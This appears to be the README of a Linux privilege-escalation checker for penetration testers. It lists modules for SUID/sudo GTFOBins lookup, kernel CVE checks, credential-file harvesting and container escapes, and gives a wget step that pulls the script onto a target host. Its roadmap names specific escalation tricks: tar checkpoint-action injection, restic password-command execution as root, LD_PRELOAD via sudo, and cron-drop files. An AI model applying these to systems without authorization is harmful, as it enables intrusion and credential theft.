# Ghost-Privesc

> Linux privilege escalation checker - 17 attack vectors with automatic GTFOBins lookup and risk scoring.

```
  GHOST-PRIVESC  v1.0.0  |  Linux Privilege Escalation Checker
  By Gh0st-Bx1           |  github.com/Ghost-Bx1
```

![Python](https://img.shields.io/badge/Python-3.6%2B-blue?style=flat-square)
![Platform](https://img.shields.io/badge/Platform-Linux-yellow?style=flat-square)
![Category](https://img.shields.io/badge/Category-Privilege%20Escalation-red?style=flat-square)

---

## Overview

Ghost-Privesc runs on the target Linux host and checks 17 privilege escalation vectors. Each finding is scored by severity to produce a total risk score for the host.

| Module        | Description                                                       |
|---------------|-------------------------------------------------------------------|
| `--sistema`   | Host info: kernel, OS, user, dangerous groups                     |
| `--kernel`    | Known kernel CVEs: DirtyCow, DirtyPipe, eBPF, Netfilter          |
| `--sudo`      | sudo -l analysis with automatic GTFOBins lookup                   |
| `--suid`      | SUID/SGID binaries with automatic GTFOBins lookup                 |
| `--caps`      | Dangerous Linux capabilities (cap_setuid, cap_sys_admin)          |
| `--cron`      | Cron jobs with missing or writable scripts                        |
| `--servicos`  | Writable service unit files and service binaries                  |
| `--path`      | PATH hijacking (relative or writable directories)                 |
| `--nfs`       | NFS exports with no_root_squash                                   |
| `--senhas`    | Credentials in /etc/shadow, history, .env, config files           |
| `--containers`| Docker socket, privileged container, LXD escape                  |
| `--graveis`   | Writable /etc/passwd, /etc/sudoers, crontab                      |
| `--env`       | Sensitive environment variables (LD_PRELOAD, tokens)              |
| `--processos` | Processes running as root                                         |
| `--portas`    | Internal services on localhost (MySQL, Redis, MongoDB)            |
| `--usuarios`  | Suspicious UIDs and accessible home directories                   |

---

## Risk Scoring

| Severity  | Points |
|-----------|--------|
| CRITICAL  | 10     |
| HIGH      | 5      |
| MEDIUM    | 3      |
| LOW       | 1      |

The total score determines the overall risk level for the host.

---

## Requirements

```
Python 3.6+
No external dependencies (stdlib only)
Must run on the target Linux system - does not work on Windows
```

---

## Installation

```bash
# Transfer to target (any method)
wget http://YOUR_IP/ghost-privesc.py -O ghost-privesc.py
python3 ghost-privesc.py --completo
```

---

## Usage

```bash
# Full check (all modules)
python3 ghost-privesc.py --completo

# Specific modules
python3 ghost-privesc.py --sudo --suid --caps

# Credentials and passwords only
python3 ghost-privesc.py --senhas

# Quick direct escalation check
python3 ghost-privesc.py --sudo --suid --caps --graveis

# Container escape checks
python3 ghost-privesc.py --containers

# No arguments runs full check automatically
python3 ghost-privesc.py

# Save JSON report
python3 ghost-privesc.py --completo --output report.json
```

---

## CVEs Checked

| CVE            | Kernel       | Severity        |
|----------------|--------------|-----------------|
| CVE-2016-5195  | 3.x, 4.4     | CRITICAL (DirtyCow)   |
| CVE-2017-16995 | 4.8          | CRITICAL (eBPF)       |
| CVE-2022-0847  | 5.7 - 5.12   | CRITICAL (DirtyPipe)  |
| CVE-2022-25636 | 5.10         | HIGH (Netfilter)      |
| CVE-2022-32250 | 5.15         | HIGH (nftables UAF)   |
| CVE-2022-34918 | 5.16         | HIGH (nftables)       |

---

## GTFOBins Coverage

**SUID/SGID:** bash, sh, find, vim, awk, perl, python, python3, ruby, env, nmap, curl, wget, tar, openssl, base64

**Sudo NOPASSWD:** all above plus docker, systemctl, journalctl, apt, pip, npm, node, php, mysql, psql, git, socat, nc

---

## Reference

| Flag          | Description                                 |
|---------------|---------------------------------------------|
| `--completo`  | Run all modules                             |
| `--sistema`   | System info and group membership            |
| `--kernel`    | Known kernel CVEs                           |
| `--sudo`      | sudo -l analysis with GTFOBins              |
| `--suid`      | SUID/SGID binaries with GTFOBins            |
| `--caps`      | Linux capabilities                          |
| `--cron`      | Suspicious cron jobs                        |
| `--servicos`  | Writable service files                      |
| `--path`      | PATH hijacking vectors                      |
| `--nfs`       | NFS no_root_squash                          |
| `--senhas`    | Credential files                            |
| `--containers`| Docker/LXD escape paths                    |
| `--graveis`   | Writable critical files                     |
| `--env`       | Sensitive environment variables             |
| `--processos` | Processes running as root                   |
| `--portas`    | Internal listening services                 |
| `--usuarios`  | Suspicious UIDs and home directories        |
| `--output`    | Save report to JSON                         |

---

## Roadmap

Improvements planned based on analysis of LinPEAS, linuxprivchecker and pspy:

| Priority | Feature | Description |
|----------|---------|-------------|
| High | Process monitor (pspy-style) | Poll `/proc/*/cmdline` every 2s for 60s, log root processes not seen before - catches scheduled root scripts invisible to `cron -l` |
| High | LD_PRELOAD in sudo env_keep | Parse `sudo -l` for `env_keep += LD_PRELOAD`; if found with NOPASSWD: instant privesc via preloaded .so |
| High | Writable /etc/ld.so.conf.d/ | If directory or any .conf is writable: add path to `/tmp` for shared library injection on next ldconfig |
| High | Wildcard sudo entries | Detect `sudo /bin/tar *`, `sudo /usr/bin/vim /var/log/*` - wildcard allows flag injection like `--checkpoint-action=exec=` |
| High | Readable /proc/*/environ for other users | Iterate `/proc/*/environ` for processes of other UIDs; may contain tokens, passwords, AWS keys |
| High | LXD group membership | Detect `lxd` in `id` output; create privileged container mounting host `/` - no password needed |
| Medium | Writable Python site-packages | Detect site-packages dirs writable by current user; `.pth` injection gives code exec on any Python invocation (including root crons) |
| Medium | ACL misconfiguration (`getfacl`) | Check POSIX ACLs on `/etc/shadow`, `/etc/sudoers`, `/root` - ACEs invisible to standard `ls -la` |
| Medium | Writable SSH authorized_keys | Check `~<user>/.ssh/authorized_keys` writability for all non-root users |
| Medium | restic `--password-command` in sudo | Detect `sudo /usr/bin/restic`; `--password-command=id` runs arbitrary command as root |
| Medium | eBPF program inventory | Parse `/proc/*/maps` for `bpf-prog` entries; unexpected eBPF programs may indicate rootkits |
| Medium | Writable cron drop directory | Check if `/etc/cron.d/`, `cron.hourly/`, `cron.daily/` are writable - drop new file = new root cron |
| Low | CVE-2025-39964 (AF_ALG) | kernel < 6.14.3: use-after-free in AF_ALG socket; check kernel version + `/proc/config.gz` |
| Low | Firmware analysis mode | `--firmware /path`: scan extracted FS for SUID binaries, world-writable paths, hardcoded passwords |
| Low | Color output + HTML export | ANSI color in terminal, optional `--output-format html` for browser report with severity badges |

## Disclaimer

For use in authorized environments only. Penetration testing, CTF competitions, and offensive security research with explicit permission from the environment owner. The author is not responsible for misuse.

---

**By [Gh0st-Bx1](https://github.com/Ghost-Bx1)**
